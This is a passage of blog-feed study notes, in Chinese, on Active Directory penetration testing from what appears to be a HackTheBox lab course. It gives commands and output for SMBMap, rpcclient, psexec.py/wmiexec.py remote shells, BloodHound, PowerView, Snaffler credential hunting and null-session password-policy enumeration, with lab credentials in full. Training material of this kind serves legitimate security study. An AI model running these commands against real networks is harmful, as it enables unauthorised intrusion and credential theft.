title="SMBMap"></a>SMBMap</h2><p>SMBMap非常适合从Linux攻击主机枚举SMB共享。它可用于收集共享、权限和共享内容的列表（如果可以访问）。一旦获得访问权限，就可以用来下载和上传文件以及执行远程命令。 与CME一样，我们可以使用SMBMap和一组域用户凭据来检查远程系统上的可访问共享</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5[+] IP: 172.16.5.5:445Name: inlanefreight.local                                       Disk                                                  PermissionsComment    ----                                                  ------------------    ADMIN$                                            NO ACCESSRemote Admin    C$                                                NO ACCESSDefault share    Department Shares                                 READ ONLY    IPC$                                              READ ONLYRemote IPC    NETLOGON                                          READ ONLYLogon server share     SYSVOL                                            READ ONLYLogon server share     User Shares                                       READ ONLY    ZZZ_archive                                       READ ONLY</code></pre><p>以上内容将告诉我们我们的用户可以访问什么以及他们的权限级别。与CME的结果一样，我们看到用户forend无法通过ADMIN$或C$共享访问DC（这是标准用户帐户所期望的），但可以通过IPC$、NETLOGON和SYSVOL进行读取访问，这是任何域中的默认访问权限。其他非标准共享，如部门共享以及用户和归档共享，是最有趣的。让我们递归地列出Department Shares共享中的目录。正如预期的那样，我们可以看到公司中每个部门的子目录。</p><h4 id="Recursive-List-Of-All-Directories"><a href="#Recursive-List-Of-All-Directories" class="headerlink" title="Recursive List Of All Directories"></a>Recursive List Of All Directories</h4><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only[+] IP: 172.16.5.5:445Name: inlanefreight.local                                       Disk                                                  PermissionsComment    ----                                                  ------------------    Department Shares                                 READ ONLY    .\Department Shares\*    dr--r--r--                0 Thu Mar 31 15:34:29 2022.    dr--r--r--                0 Thu Mar 31 15:34:29 2022..    dr--r--r--                0 Thu Mar 31 15:14:48 2022Accounting    dr--r--r--                0 Thu Mar 31 15:14:39 2022Executives    dr--r--r--                0 Thu Mar 31 15:14:57 2022Finance    dr--r--r--                0 Thu Mar 31 15:15:04 2022HR    dr--r--r--                0 Thu Mar 31 15:15:21 2022IT    dr--r--r--                0 Thu Mar 31 15:15:29 2022Legal    dr--r--r--                0 Thu Mar 31 15:15:37 2022Marketing    dr--r--r--                0 Thu Mar 31 15:15:47 2022Operations    dr--r--r--                0 Thu Mar 31 15:15:58 2022R&amp;D    dr--r--r--                0 Thu Mar 31 15:16:10 2022Temp    dr--r--r--                0 Thu Mar 31 15:16:18 2022Warehouse    &lt;SNIP&gt;</code></pre><h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><pre><code class="bash">rpcclient -U &quot;&quot; -N 172.16.5.5</code></pre><h4 id="rpcclient-Enumeration"><a href="#rpcclient-Enumeration" class="headerlink" title="rpcclient Enumeration"></a>rpcclient Enumeration</h4><p>在rpcclient中查看用户时，您可能会注意到每个用户旁边都有一个名为rid:的字段。相对标识符（RID）是Windows用来跟踪和识别对象的唯一标识符（以十六进制格式表示）</p><h4 id="RPCClient-User-Enumeration-By-RID"><a href="#RPCClient-User-Enumeration-By-RID" class="headerlink" title="RPCClient User Enumeration By RID"></a>RPCClient User Enumeration By RID</h4><pre><code class="shell-session">rpcclient $&gt; queryuser 0x457        User Name   :   htb-student        Full Name   :   Htb Student        Home Drive  :        Dir Drive   :        Profile Path:        Logon Script:        Description :        Workstations:        Comment     :        Remote Dial :        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT        unknown_2[0..31]...        user_rid :      0x457        group_rid:      0x201        acb_info :      0x00000010        fields_present: 0x00ffffff        logon_divs:     168        bad_password_count:     0x00000000        logon_count:    0x0000001d        padding1[0..7]...        logon_hrs[0..21]...</code></pre><h4 id="Enumdomusers"><a href="#Enumdomusers" class="headerlink" title="Enumdomusers"></a>Enumdomusers</h4><pre><code class="shell-session">rpcclient $&gt; enumdomusersuser:[administrator] rid:[0x1f4]user:[guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[lab_adm] rid:[0x3e9]user:[htb-student] rid:[0x457]user:[avazquez] rid:[0x458]user:[pfalcon] rid:[0x459]user:[fanthony] rid:[0x45a]user:[wdillard] rid:[0x45b]user:[lbradford] rid:[0x45c]user:[sgage] rid:[0x45d]user:[asanchez] rid:[0x45e]user:[dbranch] rid:[0x45f]user:[ccruz] rid:[0x460]user:[njohnson] rid:[0x461]user:[mholliday] rid:[0x462]&lt;SNIP&gt;  </code></pre><h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket Toolkit"></a>Impacket Toolkit</h2><p> <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></p><p>Impacket套件中最有用的工具之一是psexec.py。psexec.py是Sysinternals psexec可执行文件的克隆，但工作方式与原始文件略有不同。该工具通过将随机命名的可执行文件上载到目标主机上的ADMIN$共享来创建远程服务。然后，它通过RPC和Windows服务控制管理器注册服务。一旦建立，通信就通过命名管道进行，作为SYSTEM在受害者主机上提供一个交互式远程shell。</p><h4 id="Using-psexec-py"><a href="#Using-psexec-py" class="headerlink" title="Using psexec.py"></a>Using psexec.py</h4><pre><code class="bash">psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></pre><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a></p><p>Wmiexec.py利用了一个半交互式shell，通过Windows Management Instrumentation执行命令。它不会在目标主机上丢弃任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它以我们连接的本地管理员用户的身份运行（对于寻找入侵的人来说，这可能比看到SYSTEM执行许多命令更不明显）。与其他工具相比，这是一种在主机上更隐蔽的执行方法，但仍可能被大多数现代反病毒和EDR系统所捕获。我们将使用与psexec.py相同的帐户来访问主机。</p><pre><code class="bash">wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></pre><p>请注意，此shell环境不是完全交互式的，因此发出的每个命令都将从WMI执行一个新的cmd.exe并执行您的命令。这样做的缺点是，如果警惕的防御者检查事件日志并查看事件ID 4688：已经创建了一个新进程，他们将看到一个创建的新进程来生成cmd.exe并发出命令。</p><h2 id="Windapsearch"><a href="#Windapsearch" class="headerlink" title="Windapsearch"></a>Windapsearch</h2><p><a href="https://github.com/ropnop/windapsearch">Windapsearch</a>是另一个方便的Python脚本，我们可以使用LDAP查询从Windows域中枚举用户、组和计算机。</p><p>我们使用Windapsearch有几个选项来执行标准枚举（转储用户、计算机和组）和更详细的枚举。–da（枚举域管理员组成员）选项和-PU（查找特权用户）选项。-PU选项很有趣，因为它将对具有嵌套组成员身份的用户执行递归搜索。</p><h4 id="Windapsearch-Domain-Admins"><a href="#Windapsearch-Domain-Admins" class="headerlink" title="Windapsearch - Domain Admins"></a>Windapsearch - Domain Admins</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></pre><p>为了识别更多的潜在用户，我们可以使用-PU标志运行该工具，并检查是否有可能未被注意到的特权提升的用户。这是一个很好的报告检查，因为它很可能会通知客户具有嵌套组成员资格的多余权限的用户。</p><h4 id="Windapsearch-Privileged-Users"><a href="#Windapsearch-Privileged-Users" class="headerlink" title="Windapsearch - Privileged Users"></a>Windapsearch - Privileged Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></pre><pre><code class="shell-session">&lt;SNIP&gt;[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL[+]     Found 3 nested users for group Enterprise Admins:cn: AdministratoruserPrincipalName: administrator@inlanefreight.localcn: lab_admcn: Sharepoint AdminuserPrincipalName: sp-admin@INLANEFREIGHT.LOCAL&lt;SNIP&gt;</code></pre><h2 id="Bloodhound-py"><a href="#Bloodhound-py" class="headerlink" title="Bloodhound.py"></a>Bloodhound.py</h2><p>BloodHound是有史以来发布的用于审计Active Directory安全性的最具影响力的工具之一，它对我们作为渗透测试人员来说非常有益。我们可以获取大量耗时的数据，以筛选和创建图形表示或特定用户访问可能导致的“攻击路径”。</p><p>该工具从AD收集数据，如用户、组、计算机、组成员资格、GPO、ACL、域信任、本地管理员访问、用户会话、计算机和用户属性、RDP访问、WinRM访问等。 它最初只与PowerShell收集器一起发布，因此必须从Windows主机上运行。最终，一个社区成员发布了一个Python端口（需要Impacket、ldap3和dnspython）。当我们有有效的域凭据，但没有访问加入域的Windows主机的权限，或者没有运行SharpHound收集器的Windows攻击主机时，这在渗透测试中帮助很大。这也有助于我们不必从域主机运行收集器，因为域主机可能会被阻止或引发警报（尽管在保护良好的环境中，即使从攻击主机运行收集器也很可能引发警报）。</p><p>该工具接受带有-c或–collectionmethod标志的各种收集方法。我们可以检索特定的数据，如用户会话、用户和组、对象属性、ACLS，或者全选以收集尽可能多的数据。（ user sessions, users and groups, object properties, ACLS,）</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all INFO: Found AD domain: inlanefreight.localINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 1 domainsINFO: Found 2 domains in the forestINFO: Found 564 computersINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 2951 usersINFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 183 groupsINFO: Found 2 trustsINFO: Starting computer enumeration with 10 workers&lt;SNIP&gt;</code></pre><h4 id="Viewing-the-Results"><a href="#Viewing-the-Results" class="headerlink" title="Viewing the Results"></a>Viewing the Results</h4><h4 id="Upload-the-Zip-File-into-the-BloodHound-GUI"><a href="#Upload-the-Zip-File-into-the-BloodHound-GUI" class="headerlink" title="Upload the Zip File into the BloodHound GUI"></a>Upload the Zip File into the BloodHound GUI</h4><p>然后，我们可以键入sudo neo4j start来启动<a href="https://neo4j.com/">neo4j</a>服务，启动我们将加载数据的数据库，并对其运行Cypher查询。</p><p> <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">custom Cypher queries</a></p><h1 id="Credentialed-Enumeration-from-Windows"><a href="#Credentialed-Enumeration-from-Windows" class="headerlink" title="-Credentialed Enumeration - from Windows-"></a>-Credentialed Enumeration - from Windows-</h1><h4 id="Discover-Modules"><a href="#Discover-Modules" class="headerlink" title="Discover Modules"></a>Discover Modules</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ModuleModuleType Version    Name                                ExportedCommands---------- -------    ----                                ----------------Manifest   3.1.0.0    Microsoft.PowerShell.Utility        &#123;Add-Member, Add-Type, Clear-Variable, Compare-Object...&#125;Script     2.0.0      PSReadline                          &#123;Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...</code></pre><h4 id="Load-ActiveDirectory-Module"><a href="#Load-ActiveDirectory-Module" class="headerlink" title="Load ActiveDirectory Module"></a>Load ActiveDirectory Module</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module ActiveDirectoryPS C:\htb&gt; Get-Module</code></pre><p>现在我们的模块已经加载完毕，让我们开始吧。首先，我们将使用 <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps">Get-ADDomain</a>枚举有关域的一些基本信息。</p><h3 id="Get-Domain-Info"><a href="#Get-Domain-Info" class="headerlink" title="Get Domain Info"></a>Get Domain Info</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADDomain</code></pre><p>这将打印出有用的信息，如域SID、域功能级别、任何子域等。接下来，我们将使用Get-ADUser cmdlet。我们将筛选已填充ServicePrincipalName属性的帐户。</p><h4 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></pre><p>我们可以使用ActiveDirectory模块运行的另一个有趣的检查是使用Get-ADTrust cmdlet验证域信任关系</p><h4 id="Checking-For-Trust-Relationships"><a href="#Checking-For-Trust-Relationships" class="headerlink" title="Checking For Trust Relationships"></a>Checking For Trust Relationships</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADTrust -Filter *</code></pre><p>此cmdlet将打印出域具有的任何信任关系。我们可以确定它们是我们林中的信任还是与其他林中的域的信任、信任类型、信任方向以及与之相关的域的名称。这将在以后利用父子信任关系和跨林信任进行攻击时非常有用。接下来，我们可以使用Get-ADGroup cmdlet收集AD组信息。</p><h4 id="Group-Enumeration"><a href="#Group-Enumeration" class="headerlink" title="Group Enumeration"></a>Group Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Filter * | select name</code></pre><p>我们可以获取结果，并将感兴趣的名称反馈到cmdlet中，以获取有关特定组的更详细信息，如下所示：</p><h4 id="Detailed-Group-Info"><a href="#Detailed-Group-Info" class="headerlink" title="Detailed Group Info"></a>Detailed Group Info</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Identity &quot;Backup Operators&quot;</code></pre><p>现在我们了解了更多关于该组的信息，让我们使用get-ADGroupMember cmdlet获取成员列表。</p><h3 id="Group-Membership"><a href="#Group-Membership" class="headerlink" title="Group Membership"></a>Group Membership</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></pre><p>接下来，我们将介绍PowerView工具，它具有许多简化枚举和深入挖掘领域的功能。</p><h2 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h2><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a></p><p>PowerView是一个用PowerShell编写的工具，用于帮助我们在AD环境中获得情境感知。与BloodHound非常相似，它提供了一种识别用户在网络上登录位置的方法，枚举域信息，如用户、计算机、组、ACLS、信任、查找文件共享和密码、执行Kerberoasting等。它是一个用途广泛的工具，可以让我们深入了解客户领域的安全状况。与BloodHound相比，它需要更多的手动工作来确定域内的错误配置和关系，但如果使用得当，可以帮助我们识别细微的错误配置。</p><h4 id="Domain-User-Information"><a href="#Domain-User-Information" class="headerlink" title="Domain User Information"></a>Domain User Information</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></pre><h4 id="Recursive-Group-Membership"><a href="#Recursive-Group-Membership" class="headerlink" title="Recursive Group Membership"></a>Recursive Group Membership</h4><pre><code class="powershell-session">PS C:\htb&gt;  Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></pre><p>上面我们对DomainAdmins组进行了递归查看，以列出其成员。现在我们知道了潜在特权提升的目标。与AD PowerShell模块一样，我们还可以枚举域信任映射。</p><h4 id="Trust-Enumeration"><a href="#Trust-Enumeration" class="headerlink" title="Trust Enumeration"></a>Trust Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainTrustMapping</code></pre><p>我们可以使用Test-AdminAccess功能在当前计算机或远程计算机上测试本地管理员访问。</p><h4 id="Testing-for-Local-Admin-Access"><a href="#Testing-for-Local-Admin-Access" class="headerlink" title="Testing for Local Admin Access"></a>Testing for Local Admin Access</h4><pre><code class="powershell-session">PS C:\htb&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01ComputerName    IsAdmin------------    -------ACADEMY-EA-MS01    True </code></pre><p>上面，我们确定当前使用的用户是主机ACADEMY-EA-MS01上的管理员。我们可以对每个主机执行相同的功能，以查看我们在哪里可以进行管理访问。我们稍后将看到BloodHound执行这种检查的效果如何。现在，我们可以检查设置了SPN属性的用户，这表明该帐户可能受到Kerberoating攻击。</p><h4 id="Finding-Users-With-SPN-Set"><a href="#Finding-Users-With-SPN-Set" class="headerlink" title="Finding Users With SPN Set"></a>Finding Users With SPN Set</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></pre><h2 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h2><p>Finding Users With SPN Set</p><pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Help</code></pre><pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Identity forend</code></pre><h2 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h2><p>共享允许域中的用户快速访问与其日常角色相关的信息，并与组织共享内容。如果设置正确，域共享将要求用户加入域，并要求用户在访问系统时进行身份验证。权限也将到位，以确保用户只能访问和查看其日常角色所需的内容。过于宽松的共享可能会导致敏感信息的意外披露，尤其是那些包含医疗、法律、人事、人力资源、数据等的信息。在攻击中，获得对可以访问诸如IT&#x2F;基础设施共享之类的共享的标准域用户的控制可能导致诸如配置文件或诸如SSH密钥或密码之类的不安全存储的认证文件之类的敏感数据的泄露。我们希望发现任何类似的问题，以确保客户不会将任何数据暴露给日常工作中不需要访问的用户，并且他们符合任何法律&#x2F;法规要求（HIPAA、PCI等）。我们可以使用PowerView查找共享，然后帮助我们挖掘共享，或者使用各种手动命令查找常见字符串，如输入名称。这可能是一个乏味的过程，我们可能会错过一些东西，尤其是在大型环境中。现在，让我们花一些时间来探索Snafler工具，看看它如何帮助我们更准确、更高效地识别这些问题。</p><h2 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h2><p><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a>是一种可以帮助我们在Active Directory环境中获取凭据或其他敏感数据的工具。Snafler的工作原理是获取域中的主机列表，然后枚举这些主机以获得共享和可读目录。一旦完成，它就会遍历用户可读的任何目录，并寻找可以帮助我们在评估中更好定位的文件。Snafler要求从加入域的主机或在域用户上下文中运行。 要执行Snafler，我们可以使用以下命令：</p><h4 id="Snaffler-Execution"><a href="#Snaffler-Execution" class="headerlink" title="Snaffler Execution"></a>Snaffler Execution</h4><pre><code class="bash">Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</code></pre><p>-s命令告诉它为我们将结果打印到控制台，-d指定要在其中搜索的域，-o命令则告诉Snafler将结果写入日志文件。-v选项是详细级别。通常，数据是最好的，因为它只在屏幕上显示结果，所以开始查看工具运行更容易。Snafler可以产生大量的数据，所以我们通常应该输出到文件中，让它运行，然后再返回。在渗透测试期间，将Snafler原始输出作为补充数据提供给客户也很有帮助，因为这可以帮助他们锁定应该首先锁定的高价值股票。</p><pre><code class="powershell-session">PS C:\htb&gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></pre><p>我们可能会找到密码、SSH密钥、配置文件或其他可用于进一步访问的数据。Snafler为我们对输出进行颜色编码，并为我们提供共享中文件类型的概要。 既然我们有了关于INLANEFREIGHT.LOCAL域的丰富数据（希望能清除注释和日志文件输出！），我们需要一种方法来关联它并将其可视化。让我们深入了解BloodHound，看看这个工具在任何以AD为中心的安全评估中有多强大。</p><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>Bloodhound是一款出色的开源工具，可以通过分析对象之间的关系来识别AD环境中的攻击路径。</p><p>我们必须从位于网络内（但未加入域）的Windows攻击主机中作为域用户进行身份验证，或者将工具转移到加入域的主机。</p><h4 id="SharpHound-in-Action"><a href="#SharpHound-in-Action" class="headerlink" title="SharpHound in Action"></a>SharpHound in Action</h4><pre><code class="powershell-session">PS C:\htb&gt;  .\SharpHound.exe --help</code></pre><p>我们将从MS01攻击主机运行SharpHound.exe收集器开始。</p><pre><code class="powershell-session">PS C:\htb&gt; .\SharpHound.exe -c All --zipfilename ILFREIGHT</code></pre><p>接下来，我们可以将数据集过滤到我们自己的虚拟机中，或者将其吸收到MS01上的BloodHound GUI工具中。</p><p>有时，我们会看到主机不再通电，但仍显示为AD中的记录。在报告中提出建议之前，我们应该始终验证它们是否“活动”。我们可能会为遗留操作系统写一个高风险的发现，或者为清理AD中的旧记录写一个最佳实践建议。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Deeper Down the Rabbit Hole&lt;ul&gt;
&lt;li&gt;认证枚举&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cooking with Fire&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD_2</title>
    <link href="https://taninluv.github.io/2023/09/24/AD-2/"/>
    <id>https://taninluv.github.io/2023/09/24/AD-2/</id>
    <published>2023-09-24T09:12:45.000Z</published>
    <updated>2023-10-03T03:52:18.083Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sighting In, Hunting For A User</li><li>Spray Responsibly</li></ul><span id="more"></span><h2 id="Enumerating-the-Password-Policy-from-Linux-Credentialed"><a href="#Enumerating-the-Password-Policy-from-Linux-Credentialed" class="headerlink" title="Enumerating the Password Policy - from Linux - Credentialed"></a>Enumerating the Password Policy - from Linux - Credentialed</h2><p>我们可以通过多种方式提取域密码策略，具体取决于域的配置方式以及我们是否具有有效的域凭据。使用有效的域凭据，还可以使用CrackMapExec或rpcclient等工具远程获取密码策略。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-polSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHTSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not SetSMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Refuse Password Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Store Cleartext: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Lockout Admins: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Clear Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Anon Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Complex: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions"><a href="#Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions" class="headerlink" title="Enumerating the Password Policy - from Linux - SMB NULL Sessions"></a>Enumerating the Password Policy - from Linux - SMB NULL Sessions</h2><blockquote><p>SMB NULL Sessions（SMB空会话）是指在Microsoft Windows网络中的SMB（Server Message Block）协议中，允许未经身份验证的访问网络共享资源的一种机制。这是一种安全性问题，因为未经身份验证的用户可以访问共享文件夹和其他资源，可能导致潜在的安全风险和信息泄露。</p></blockquote><p>如果&#x3D;&#x3D;没有凭据&#x3D;&#x3D;，我们可以通过SMB NULL会话或LDAP匿名绑定获取密码策略。第一种是通过SMB NULL会话。SMB NULL会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。SMB NULL会话配置错误通常是由于旧版域控制器升级到位，最终导致不安全的配置，而这些配置默认存在于旧版本的Windows Server中。 在早期版本的Windows Server中创建域时，会向某些共享授予匿名访问权限，从而允许域枚举。SMB NULL会话可以轻松枚举。对于枚举，我们可以使用enum4linux、CrackMapExec、rpcclient等工具。 我们可以使用rpcclient检查域控制器的SMB NULL会话访问。 连接后，我们可以发出一个RPC命令，如querydominfo，以获取有关域的信息并确认NULL会话访问。</p><h4 id="Using-rpcclient"><a href="#Using-rpcclient" class="headerlink" title="Using rpcclient"></a>Using rpcclient</h4><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1</code></pre><h4 id="Obtaining-the-Password-Policy-using-rpcclient"><a href="#Obtaining-the-Password-Policy-using-rpcclient" class="headerlink" title="Obtaining the Password Policy using rpcclient"></a>Obtaining the Password Policy using rpcclient</h4><pre><code class="shell-session">rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1rpcclient $&gt; getdompwinfomin_password_length: 8password_properties: 0x00000001    DOMAIN_PASSWORD_COMPLEX</code></pre><h4 id="Using-enum4linux"><a href="#Using-enum4linux" class="headerlink" title="Using enum4linux"></a>Using enum4linux</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -P 172.16.5.5&lt;SNIP&gt; ================================================== |    Password Policy Information for 172.16.5.5    | ================================================== [+] Attaching to 172.16.5.5 using a NULL share[+] Trying protocol 139/SMB...    [!] Protocol failed: Cannot request session (Called Name:172.16.5.5)[+] Trying protocol 445/SMB...[+] Found domain(s):    [+] INLANEFREIGHT    [+] Builtin[+] Password Info for Domain: INLANEFREIGHT    [+] Minimum password length: 8    [+] Password history length: 24    [+] Maximum password age: Not Set    [+] Password Complexity Flags: 000001        [+] Domain Refuse Password Change: 0        [+] Domain Password Store Cleartext: 0        [+] Domain Password Lockout Admins: 0        [+] Domain Password No Clear Change: 0        [+] Domain Password No Anon Change: 0        [+] Domain Password Complex: 1    [+] Minimum password age: 1 day 4 minutes     [+] Reset Account Lockout Counter: 30 minutes     [+] Locked Account Duration: 30 minutes     [+] Account Lockout Threshold: 5    [+] Forced Log off Time: Not Set[+] Retieved partial password policy with rpcclient:Password Complexity: EnabledMinimum Password Length: 8enum4linux complete on Tue Feb 22 17:39:29 2022</code></pre><p>工具<a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a>是对Python中enum4linux的重写，但具有其他功能，如将数据导出为YAML或JSON文件的能力，这些文件稍后可用于进一步处理数据或将其提供给其他工具。除其他功能外，它还支持彩色输出</p><h4 id="Using-enum4linux-ng"><a href="#Using-enum4linux-ng" class="headerlink" title="Using enum4linux-ng"></a>Using enum4linux-ng</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreightENUM4LINUX - next generation&lt;SNIP&gt; =======================================|    RPC Session Check on 172.16.5.5    | =======================================[*] Check for null session[+] Server allows session using username &#39;&#39;, password &#39;&#39;[*] Check for random user session[-] Could not establish random user session: STATUS_LOGON_FAILURE =================================================|    Domain Information via RPC for 172.16.5.5    | =================================================[+] Domain: INLANEFREIGHT[+] SID: S-1-5-21-3842939050-3880317879-2865463114[+] Host is part of a domain (not a workgroup) =========================================================|    Domain Information via SMB session for 172.16.5.5    |========================================================[*] Enumerating via unauthenticated SMB session on 445/tcp[+] Found domain information via SMBNetBIOS computer name: ACADEMY-EA-DC01NetBIOS domain name: INLANEFREIGHTDNS domain: INLANEFREIGHT.LOCALFQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL =======================================|    Policies via RPC for 172.16.5.5    | =======================================[*] Trying port 445/tcp[+] Found policy:domain_password_information:  pw_history_length: 24  min_pw_length: 8  min_pw_age: 1 day 4 minutes  max_pw_age: not set  pw_properties:  - DOMAIN_PASSWORD_COMPLEX: true  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: falsedomain_lockout_information:  lockout_observation_window: 30 minutes  lockout_duration: 30 minutes  lockout_threshold: 5domain_logoff_information:  force_logoff_time: not setCompleted after 5.41 seconds</code></pre><h4 id="Displaying-the-contents-of-ilfreight-json"><a href="#Displaying-the-contents-of-ilfreight-json" class="headerlink" title="Displaying the contents of ilfreight.json"></a>Displaying the contents of ilfreight.json</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat ilfreight.json &#123; 